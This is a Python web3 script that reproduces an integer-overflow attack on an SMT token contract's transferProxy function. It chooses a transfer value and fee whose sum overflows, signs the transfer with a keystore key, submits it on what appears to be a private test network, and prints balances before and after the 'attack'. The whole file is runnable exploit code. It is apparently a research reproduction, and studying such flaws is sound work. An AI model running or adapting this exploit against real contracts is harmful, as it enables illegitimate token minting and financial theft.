import time
from web3 import Web3
from web3.auto import w3
from hexbytes import HexBytes
from attrdict import AttrDict
from solc import compile_source
from web3.contract import ConciseContract

# The address is printed by deploy_SMT.py on the node of contract constructor.
contract_address = "0xA3429967a2D331b0AFFC3c12f79c023e20c86119"
# Path of the source code of the SMT contract
sol_path = "/media/sf_Shared_Folder/stm-contrace_original.sol"
interface_keystr = '<stdin>:SMT'

# we need two accounts and the sender should have some eth on the private network
signer = w3.eth.accounts[1]
sender = w3.eth.accounts[0]
signer_pin = "  " # password to unlock the signer
sender_pin = "  " # password to unlock the sender
print("Signer: " + signer)
print("Sender: " + sender)

 # value and fee shouble be hex, and len(value) should be 64
value = "8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" 
fee =   "7000000000000000000000000000000000000000000000000000000000000001"

signer_key_path = "/home/tester2/.ethereum/keystore/UTC--2018-04-28T09-19-51.310624795Z--be508beae664f9db63b24284b794e2e1fe36f343"

# connecting to SMT constract
contract_file = open(sol_path)
contract_soucecode = contract_file.read()
compiled_sol = compile_source(contract_soucecode)

contract_interface = compiled_sol[interface_keystr]
contract = w3.eth.contract(address=contract_address, abi=contract_interface['abi'])

print("Balance of Signer Before Attack: " + hex(contract.functions.balanceOf(signer).call()))
print("Balance of Sender Before Attack: " + hex(contract.functions.balanceOf(sender).call()))

nonce = hex(contract.functions.getNonce(signer).call())[2:]
while (len(nonce) < 64):
    nonce = "0" + nonce
print("nonce: " + nonce)

# generating signing values
to_sign = signer + signer[2:] + value + fee + nonce

hash = Web3.sha3(HexBytes(to_sign))
print("The Hash is: " + hash.hex())

key_file = open(signer_key_path)
encrypted_key = key_file.read()
private_key = w3.eth.account.decrypt(encrypted_key, signer_pin)
signed_message = w3.eth.account.signHash(hash, private_key)

s = signed_message.get('s')
r = signed_message.get('r')
v = signed_message.get('v')

print("signed_message - s: " + hex(s))
print("signed_message - r: " + hex(r))
print("signed_message - v: " + hex(v))
value_int = int(value, 16)
fee_int = int(fee, 16)
r_bytes = Web3.toBytes(r)
s_bytes = Web3.toBytes(s)
func = contract.functions.transferProxy(signer, signer, value_int, fee_int, v, r_bytes, s_bytes)
gas = func.estimateGas()
w3.personal.unlockAccount(sender, sender_pin)
trans_id = func.transact(transaction={'from': sender, 'gas': gas })

while True:
    rect = w3.eth.getTransactionReceipt(trans_id)
    if rect != None:
        print("RECEIPT: " + str(rect))
        break
    time.sleep(1)

print("Balance of Signer After Attack: " + hex(contract.functions.balanceOf(signer).call()))
print("Balance of Sender After Attack: " + hex(contract.functions.balanceOf(sender).call()))
